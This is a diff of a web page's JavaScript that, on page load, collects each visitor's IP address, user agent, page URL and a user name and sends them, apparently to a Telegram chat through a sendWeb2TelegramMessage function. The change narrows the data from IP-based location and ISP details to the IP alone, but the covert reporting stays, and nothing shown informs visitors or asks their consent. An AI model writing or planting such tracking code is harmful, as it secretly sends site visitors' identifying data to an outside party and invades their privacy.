@@ -33,27 +33,22 @@ window.onload = function() {
     // Get User Agent
     var userAgent = navigator.userAgent;
 
-    // Create XMLHttpRequest to get IP and location details
+    // Create XMLHttpRequest to get IP
     var ipXhr = new XMLHttpRequest();
-    ipXhr.open("GET", "https://ipapi.co/json/", true);
+    ipXhr.open("GET", "https://api.ipify.org?format=json", true);
     ipXhr.onreadystatechange = function() {
       if (ipXhr.readyState === 4) {
         if (ipXhr.status === 200) {
           var response = JSON.parse(ipXhr.responseText);
           var userIp = response.ip;
-          var city = response.city || 'Unknown';
-          var region = response.region || 'Unknown';
-          var country = response.country_name || 'Unknown';
-          var isp = response.org || 'Unknown';
-          
-          // Construct the message with IP and location details
-          const message = `🥶 : ${userName}\n📍: ${userIp}\n🗼: ${city}, ${region}, ${country}\n🏢: ${isp}\n\n🔮: ${websiteUrl}\n\n🧪 : ${userAgent}\n\n<b>#Website User 🎨</b>`;
+          // Construct the message including website URL and User Agent
+          const message = `👤 : ${userName}\n📍: ${userIp}\n🔗: ${websiteUrl}\n\n🦠 : ${userAgent}\n\n<b>#Website User</b>`;
           // Send the message
           sendWeb2TelegramMessage(message);
         } else {
           console.error('Error fetching IP:', ipXhr.statusText);
           // Fallback if IP fetch fails
-          const message = `👤 : ${userName}\n📍: IP not available\n\n🐾: ${websiteUrl}\n\n🃏 : ${userAgent}\n<b>#Website User 👁️</b>`;
+          const message = `👤 : ${userName}\n📍: IP not available\n🌐: ${websiteUrl}\n🃏 : ${userAgent}\n<b>#Website User</b>`;
           sendWeb2TelegramMessage(message);
         }
       }
